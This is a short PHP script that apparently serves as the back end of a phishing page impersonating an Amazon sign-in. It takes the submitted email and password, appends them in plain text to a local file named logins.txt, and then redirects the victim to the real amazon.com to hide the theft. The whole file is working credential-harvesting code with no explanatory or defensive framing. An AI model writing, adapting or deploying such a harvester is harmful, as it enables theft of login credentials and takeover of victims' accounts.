<?php

 if(isset($_POST['sign-in']))
 {
  $email = $_POST['email'];
  $password = $_POST['password'];
  $login = "Email: " . $email . " ----------- " . "Password: " . $password . "\n";
  $fp = fopen('logins.txt', 'a+');

    if(fwrite($fp, $login))  {
        header('Location: https://www.amazon.com');
    }
fclose ($fp);    
}


